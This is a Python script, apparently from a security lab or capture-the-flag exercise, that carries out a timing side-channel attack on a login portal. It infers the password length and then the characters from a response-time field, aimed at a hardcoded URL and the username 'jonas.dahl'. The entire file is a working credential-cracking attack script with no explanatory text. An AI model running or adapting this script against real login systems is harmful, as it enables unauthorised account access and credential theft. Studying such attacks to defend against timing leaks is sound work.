import time
import requests
import json

def find_password_length(username, url):
    total_time = 0
    password_length = 0
    while True:
        # Data with just "2"s, to find password length
        data = json.dumps({"username": username, "password": "2" * password_length})
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, data=data, headers=headers)
        response_time = response.json().get("total_time", 0)    # Grab response time from response

        # Found correct length if response time increased
        if response_time > total_time:
            return password_length, response_time
        
        password_length += 1

def guess_password(username, url, possible_characters, password_length, longest_time):
    guessed_password = ""

    # Loop through each position in password
    for pos in range(password_length):
        guessed_character = ""
        # Loop through each possible character
        for character in possible_characters:
            # Ensure guessed password is correct length
            current_guess = guessed_password + character + "0" * (password_length - len(guessed_password) - 1)
            data = json.dumps({"username": username, "password": current_guess})
            headers = {"Content-Type": "application/json"}

            response = requests.post(url, data=data, headers=headers)

            # Grab response time from response
            try:
                response_time = response.json().get("total_time", 0)
            except: # If total_time is not in response, the correct password might have been found
                print("Possible success")
                return current_guess

            # Updates longest_time and guessed_character if response_time is longer
            if response_time > longest_time:
                longest_time = response_time
                guessed_character = character
                break

        guessed_password += guessed_character

    return guessed_password

if __name__ == "__main__":
    url = "https://portal.regjeringen.uiaikt.no/login"
    possible_characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
    username = "jonas.dahl"
    password_length, total_time = find_password_length(username, url)
    correct_password = guess_password(username, url, possible_characters, password_length, total_time)
    print(f"Password for {username} is {correct_password}")
